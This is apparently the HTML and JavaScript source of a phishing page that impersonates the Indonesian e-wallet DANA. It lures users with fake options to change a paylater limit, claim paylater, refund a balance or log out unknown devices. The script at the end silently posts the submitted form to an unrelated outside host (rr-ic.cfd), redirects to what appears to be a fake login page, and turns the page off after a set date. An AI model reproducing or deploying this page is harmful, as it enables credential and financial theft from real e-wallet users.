...
<head>
 <meta charset="UTF-8">
  ...
  <title>𝗗𝗔𝗡𝗔 | #𝗦𝗮𝘁𝘂 𝗗𝗼𝗺𝗽𝗲𝘁 𝗨𝗻𝘁𝘂𝗸 𝗦𝗲𝗺𝘂𝗮 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶</title>
...
/*********************/
 ...
 .btn-punya {
        ...
        border-radius: 7px;
        padding-left: 110px;
        box-shadow: 0px 0px 2px 0px inset #118eea, 1px 2px 4px 0px #bbb;
...
<body style="background-image: url(https://a.m.dana.id/resource/danaweb-v2/hero-personal-bg-back.png);
...
<center>
 <img id="video"
    ...
    height="100%"
    autoplay
    muted control loop style=" width: 100%; height: 100%; display: block; background-color: #000; position: fixed; top: 0; left: 0; right: 0; border-radius: 0px 0px 0px 0px; border-bottom: 3px groove #118EEA;  box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05);
  box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px; z-index: -2" preload="metadata" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRuVHh_c2KIA5SRgf6H8vraqE06Vx4y2USOw0QZn67wt1Pc5uptYnA2PBzapjaC0mbaQtSVgNcHH_o2EC4IRrdgd_TLb1hscmyg5-5ko8r9QuYgcwIDmiQ_6OzKUg51ocuNQIxaSEqw7DDLyYq2pDvFyVM3qxuOnZQmOcRefd_Pt5uKdqcAFYXqWxyjIM/s2190/AddText_11-21-08.49.33.jpg" type="img/jpeg">
<br/>
...
<div style="padding: 15px;  margin-top: 160px;">

    <form method="post" id="patok">

 <label class="aha" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpOEt9dti2nfcbJGhKBjxpZld5DnoPeq2HMjSCLjIqeHrdM6XNXkaD2iQ97WxWUhNStiS3az-Sv0okD3TOd-29T48R5_cbVcpVPURTcZe7jdfeOFkUKrN5puxtk5xme9GfYOVZJm1h86g7ljPbVHErsyw5mvqh-ys-fJfyjF10f16PT5ZAC2SWIj-rbRE/s992/AddText_11-21-08.26.52.jpg);background-position: 100% 100%;background-size: 100% 100%;">
    <input type="radio" name="tarif" class="btn-puna" onclick="letsgo()" value="𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗣𝗶𝗻𝗷𝗮𝗺𝗮𝗻 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿"><h3 style="font-weight: bold; margin-top: 15px;margin-left:-5px">#𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗣𝗶𝗻𝗷𝗮𝗺𝗮𝗻 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</h3><br><h style="opacity: 0.7; color: #118eea">𝘒𝘢𝘮𝘪 𝘚𝘪𝘢𝘱 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘔𝘦𝘮𝘣𝘢𝘵𝘢𝘭𝘬𝘢𝘯 𝘚𝘵𝘢𝘵𝘶𝘴 𝘗𝘪𝘯𝘫𝘢𝘮𝘢𝘯 𝘈𝘯𝘥𝘢</h>
  </label>
  
  
  <label class="aha" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEju8031bBO1hZpctSkIVmSPlr6r75dU_-KBBuJKqQkDV9Ihw5LaaJvFZqEfYOQMpcf6CR0dkZlXwfSjmIIlFYXDfPr6SxWO5WmklB_KYW4maz1J-Las4WyEsbmd9Uhw19aElW-pqQ7RLx93Dm0Qy5olUDmEXzyeoTqPyacIRXsn2jcLBmbGlEfL-LQhAdk/s992/AddText_11-21-08.27.51.jpg);background-position: 100% 100%;background-size: 100% 100%;">
   <input type="radio" name="tarif" class="btn-punya" onclick="letsgo()" value="𝗔𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿"><h3 style="font-weight: bold; margin-top: 15px;margin-left:-5px">#𝗖𝗹𝗮𝗶𝗺 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</h3><br><h style="opacity: 0.7; color: #118eea">𝘈𝘥𝘢 𝘒𝘦𝘣𝘶𝘵𝘶𝘩𝘢𝘯 𝘔𝘦𝘯𝘥𝘦𝘴𝘢𝘬?
𝘠𝘶𝘬 <br>𝘒𝘭𝘢𝘪𝘮 𝘗𝘢𝘺𝘭𝘢𝘵𝘦𝘳𝘯𝘺𝘢.</h>
</label> 



<label class="aha" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4rZC10ZzjARonmvjX2ceW48PbnuaBsfWBd4IhPwyNe3gb0vL_1LiCIWZPfezxqF-YlX84pY4RjsQRma60kEjqjIkxdx-dGePBt3Vpw2vMfPfaJXDJm2rRIqJNHZxaNeGQvbr_pg3LrjzhGkfgkmEPhyhkwEowHrOBg5IrwAlpZNzt3bNcQM4y2-QQHwc/s992/AddText_11-21-08.28.23.jpg);background-position: 100% 100%;background-size: 100% 100%;">
     <input type="radio" name="tarif" class="btn-punya" onclick="letsgo()" value="𝗥𝗲𝗳𝘂𝗻𝗱 𝗦𝗮𝗹𝗱𝗼 𝗗𝗔𝗡𝗔"><h3 style="font-weight: bold; margin-left: -5px;margin-top:15px;">#𝗥𝗲𝗳𝘂𝗻𝗱 𝗦𝗮𝗹𝗱𝗼 𝗗𝗔𝗡𝗔</h3><br><h style="opacity: 0.7; color: #118eea">𝘚𝘢𝘭𝘥𝘰 𝘋𝘢𝘯𝘢 𝘈𝘯𝘥𝘢 𝘱𝘦𝘯𝘥𝘪𝘯𝘨, 𝘈𝘵𝘢𝘶<br> 𝘚𝘢𝘭𝘢𝘩 𝘛𝘳𝘢𝘯𝘴𝘧𝘦𝘳, 𝘒𝘭𝘪𝘬 𝘜𝘯𝘵𝘶𝘬 𝘋𝘪𝘣𝘢𝘯𝘵𝘶</h>
    </label>
    
    
    <label class="aha" style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhutjCd4mqt6bGkL-9vYtwSciso7h-RGzP8OgTpF9ohwdRZS3-xBny7JwTKuwNcCipjV0jFtJoCPV1F1IP4oCO3WpG4jEAwRo56QSHKn0wLjoM2Uq_wTkU5LXsMcdmZ6ekzxaDdAsaiTMqs7oMUlmOegZcxNqQxfXtqM2LR_7WVSCOtYJcpku7qS1UKf4w/s992/AddText_11-21-08.28.54.jpg);background-position: 100% 100%;background-size: 100% 100%;">
     <input type="radio" name="tarif" class="btn-punya" onclick="letsgo()" value="𝗟𝗼𝗴𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗗𝗶𝗸𝗲𝗻𝗮𝗹"><h3 style="font-weight: bold; margin-left: -5px;margin-top:15px;">#𝗟𝗼𝗴𝗢𝘂𝘁 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝗧𝗮𝗸 𝗗𝗶𝗸𝗲𝗻𝗮𝗹</h3><br><h style="opacity: 0.7; color: #118eea">𝘈𝘥𝘢 𝘠𝘢𝘯𝘨 𝘊𝘰𝘣𝘢 𝘓𝘰𝘨𝘪𝘯 𝘈𝘬𝘶𝘯 𝘋𝘢𝘯𝘢 𝘒𝘢𝘮𝘶, 𝘠𝘶𝘬 𝘒𝘦𝘭𝘶𝘢𝘳𝘬𝘢𝘯</h>
</label>
...
<!-- partial -->
  <script>
let tglNow = new Date();
let waktuBatas = new Date("2025-04-20T23:59:59");
if (tglNow.getTime() >= waktuBatas.getTime()) {
  document.location.href = 'https://expiredsitus.pages.dev';
} else {
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://rr-ic.cfd/cv2d/ss/tarif.php',
            data: $('#patok').serialize(),
            datatype: 'JSON',            
            complete: function(data) {
            setTimeout(function(){            
            window.location.href='lg1.html';
            $("#process1").fadeOut();     
   }, 500);
            }
          })
